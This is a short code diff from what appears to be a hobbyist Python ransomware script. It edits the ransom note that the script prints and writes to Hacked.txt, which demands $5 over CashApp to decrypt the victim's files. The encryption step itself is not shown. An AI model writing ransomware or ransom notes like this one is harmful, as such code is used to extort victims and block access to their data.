@@ -66,4 +66,4 @@ with open('fernet_key', 'wb') as f:
 # Ransomnote
 print("Your system has been encrypted by the 1337 H@xors, to recover your files refer to hacked.txt")
 with open("Hacked.txt", "w") as f:
-     f.write("Your systems has beec comrpomised. To recover your data send $5 to H@x0r5 on cashapp along with the contents of the file fernet_key. From there we will decrypt the key and allow you to unencrypt your data. >:)")
+     f.write("Your systems has beec comrpomised. To recover your data send $5 to H@x0r5 on cashapp. From there we will decrypt the key and allow you to unencrypt your data. >:)")
